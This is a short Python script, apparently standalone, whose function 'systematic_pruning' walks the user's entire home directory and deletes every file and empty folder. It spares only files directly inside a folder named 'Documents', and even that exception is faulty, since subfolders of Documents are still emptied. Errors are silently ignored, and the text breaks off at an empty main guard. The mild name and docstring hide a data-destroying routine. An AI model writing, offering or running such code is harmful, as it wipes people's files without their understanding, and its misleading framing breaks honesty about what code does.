import os

def systematic_pruning(root_dir):
    """
    Recursively deletes all files and subdirectories in the given directory,
    except for the primary workspace (main directory).
    """
    # Define the primary workspace (main directory)
    primary_workspace = 'Documents'

    # Iterate through the directory tree
    for root, dirs, files in os.walk(root_dir):
        # Check if the current directory is the primary workspace
        if os.path.basename(root) == primary_workspace:
            continue  # Skip the primary workspace

        # Delete all files and subdirectories
        for dir in dirs:
            try:
                os.rmdir(os.path.join(root, dir))
            except OSError:
                pass  # Ignore if the directory is not empty

        for file in files:
            try:
                os.remove(os.path.join(root, file))
            except OSError:
                pass  # Ignore if the file is in use

def main():
    # Set the root directory to the user's home directory
    root_dir = os.path.expanduser('~')

    # Perform the systematic pruning
    systematic_pruning(root_dir)

if __name__ == '__main__':
